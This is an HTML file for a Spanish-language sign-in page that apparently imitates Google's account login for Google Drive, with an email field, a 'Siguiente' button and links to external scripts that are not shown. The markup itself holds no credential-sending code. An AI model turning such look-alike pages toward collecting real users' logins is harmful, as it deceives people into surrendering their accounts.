<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Iniciar sesión</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="fontawesome/css/all.css">
    <link rel="stylesheet" href="css/custom.css">
    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
</head>
<body>
    <div class="container-fluid">
        <div class="container login-container">
            <div class="container">
                <div class="text-center">
                    <img src="img/brand-logo-2.png" class="login-logo">
                </div>           
                <div class="text-center">
                    <div style="font-size: 1.3em; font-weight: 600;margin-top: 10px;">Iniciar sesión</div>
                    <div style="font-size: 0.8em; font-weight: 600;margin-top: 10px;">Ir a Google Drive</div>
                </div>     
                
                <form action="" class="login-form">
                    <div class="login-field-email">
                        <p class="login-field-title">Correo electrónico o teléfono</p>
                        <input type="text" name="" id="txt-email" class='focus-field' placeholder="Correo electrónico o teléfono"> 
                        <div class="invalid-feedback">
                            Introduce una direccion de correo electronico o un numero de telefono
                        </div>                       
                    </div>
                    <a href="#" id="forgot-email-link">¿Has olvidado tu correo electrónico?</a><br><br>
                    <p style="font-size: 0.9em">¿No es tu ordenador? Usa el modo invitados para iniciar sesión de forma privada. <a href="#" class="login-form-link">Más información</a></p>
                    <br>
                    <a href="#" class="login-form-link">Crear cuenta</a>
                    <button class="btn btn-primary login-form-link" id="btn-login1" style="float:right">Siguiente</button>
                </form>
                
            </div>            
        </div>
    </div>
    
    <script src="js/jquery.min.js"></script>
    <script src="js/controlador.js"></script>
    <script src="js/validacion.js"></script>

</body>
</html>
